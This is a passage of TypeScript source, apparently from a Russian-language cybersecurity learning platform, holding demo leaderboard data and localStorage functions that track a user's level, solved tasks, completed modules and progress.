  { id: 'u3', name: 'r3d_team', level: 'advanced', score: 870, solvedTasks: ['task-5','task-6','task-8'], completedCourses: [], avatar: '🔴', joinDate: '2024-10-01' },
  { id: 'u4', name: 'shellcode99', level: 'advanced', score: 720, solvedTasks: ['task-5','task-6'], completedCourses: ['course-4'], avatar: '💻', joinDate: '2024-10-12' },
  { id: 'u5', name: 'beginner_pro', level: 'beginner', score: 650, solvedTasks: ['task-1','task-2','task-3','task-4'], completedCourses: ['course-1','course-3'], avatar: '🌱', joinDate: '2024-11-01' },
  { id: 'u6', name: 'crypto_fan', level: 'beginner', score: 520, solvedTasks: ['task-1','task-2','task-3'], completedCourses: ['course-1'], avatar: '🔐', joinDate: '2024-11-15' },
  { id: 'u7', name: 'linux_king', level: 'beginner', score: 410, solvedTasks: ['task-1','task-2','task-4'], completedCourses: ['course-3'], avatar: '🐧', joinDate: '2024-12-01' },
  { id: 'u8', name: 'web_wizard', level: 'advanced', score: 380, solvedTasks: ['task-6','task-7'], completedCourses: [], avatar: '🕸️', joinDate: '2024-12-10' },
  { id: 'u9', name: 'newbie2024', level: 'beginner', score: 270, solvedTasks: ['task-1','task-2'], completedCourses: [], avatar: '👾', joinDate: '2025-01-05' },
  { id: 'u10', name: 'flag_hunter', level: 'beginner', score: 200, solvedTasks: ['task-1'], completedCourses: [], avatar: '🚩', joinDate: '2025-01-20' },
];

// ============================================================
// ФУНКЦИИ ДЛЯ РАБОТЫ С localStorage
// ============================================================

const CURRENT_USER_KEY = 'cyberlearn_user';
const LEADERBOARD_KEY = 'cyberlearn_leaderboard';
const TEST_COMPLETED_KEY = 'cyberlearn_test_done';

/** Проверить, прошёл ли пользователь входной тест */
export function isTestCompleted(): boolean {
  return localStorage.getItem(TEST_COMPLETED_KEY) === 'true';
}

/** Отметить тест как пройденный и выставить уровень */
export function completeTest(level: Level): void {
  localStorage.setItem(TEST_COMPLETED_KEY, 'true');
  // Если пользователь уже есть — обновляем уровень, иначе создаём нового
  const raw = localStorage.getItem(CURRENT_USER_KEY);
  if (raw) {
    const user = JSON.parse(raw) as User;
    user.level = level;
    localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
  }
}

/** Сбросить флаг теста (для кнопки "Пройти тест снова" в профиле) */
export function resetTest(): void {
  localStorage.removeItem(TEST_COMPLETED_KEY);
}

/** Инициализирует все данные при первом запуске */
export function initStore(): void {
  if (!localStorage.getItem(LEADERBOARD_KEY)) {
    localStorage.setItem(LEADERBOARD_KEY, JSON.stringify(DEMO_LEADERBOARD));
  }
  if (!localStorage.getItem(CURRENT_USER_KEY)) {
    const defaultUser: User = {
      id: 'current',
      name: 'Student',
      level: 'beginner',
      score: 65,
      solvedTasks: ['task-1'],
      completedCourses: [],
      completedModules: [],
      avatar: '🛡️',
      joinDate: new Date().toISOString(),
    };
    localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(defaultUser));
  }
}

/** Получить текущего пользователя */
export function getCurrentUser(): User {
  const raw = localStorage.getItem(CURRENT_USER_KEY);
  if (!raw) { initStore(); return getCurrentUser(); }
  return JSON.parse(raw) as User;
}

/** Сохранить текущего пользователя */
export function saveCurrentUser(user: User): void {
  localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
}

/** Добавить решённую задачу и начислить очки */
export function solveTask(taskId: string, points: number): User {
  const user = getCurrentUser();
  if (!user.solvedTasks.includes(taskId)) {
    user.solvedTasks.push(taskId);
    user.score += points;
    saveCurrentUser(user);
    updateLeaderboard(user);
  }
  return user;
}

/** Завершить модуль */
export function completeModule(moduleId: string): User {
  const user = getCurrentUser();
  if (!user.completedModules.includes(moduleId)) {
    user.completedModules.push(moduleId);
    user.score += 5;
    saveCurrentUser(user);
    updateLeaderboard(user);
  }
  return user;
}

/** Обновить позицию текущего пользователя в лидерборде */
function updateLeaderboard(user: User): void {
  const lb = getLeaderboard();
  const existingIdx = lb.findIndex(u => u.id === 'current');
  const entry = { id: 'current', name: user.name, level: user.level, score: user.score, solvedTasks: user.solvedTasks, completedCourses: user.completedCourses, avatar: user.avatar, joinDate: user.joinDate };
  if (existingIdx >= 0) lb[existingIdx] = entry;
  else lb.push(entry);
  lb.sort((a, b) => b.score - a.score);
  localStorage.setItem(LEADERBOARD_KEY, JSON.stringify(lb));
}

/** Получить таблицу лидеров */
export function getLeaderboard(): Omit<User, 'completedModules'>[] {
  const raw = localStorage.getItem(LEADERBOARD_KEY);
  if (!raw) return DEMO_LEADERBOARD;
  return JSON.parse(raw) as Omit<User, 'completedModules'>[];
}

/** Сбросить все данные (включая флаг теста) */
export function resetAllData(): void {
  localStorage.removeItem(CURRENT_USER_KEY);
  localStorage.removeItem(LEADERBOARD_KEY);
  localStorage.removeItem(TEST_COMPLETED_KEY);
  initStore();
}

/** Получить задачи по уровню */
export function getTasksByLevel(level: Level): Task[] {
  return ALL_TASKS.filter(t => t.level === level);
}

/** Получить курсы по уровню */
export function getCoursesByLevel(level: Level): Course[] {
  return ALL_COURSES.filter(c => c.level === level);
}

/** Процент решённых задач */
export function getSolvedPercent(user: User, level: Level): number {
  const tasks = getTasksByLevel(level);
  if (!tasks.length) return 0;
  const solved = tasks.filter(t => user.solvedTasks.includes(t.id)).length;
  return Math.round((solved / tasks.length) * 100);
}

/** Процент пройденных курсов */
export function getCourseProgress(user: User, courseId: string): number {
  const course = ALL_COURSES.find(c => c.id === courseId);
  if (!course) return 0;
  const totalModules = course.modules.length;
  const completedModules = course.modules.filter(m => user.completedModules.includes(m.id)).length;
  return Math.round((completedModules / totalModules) * 100);
}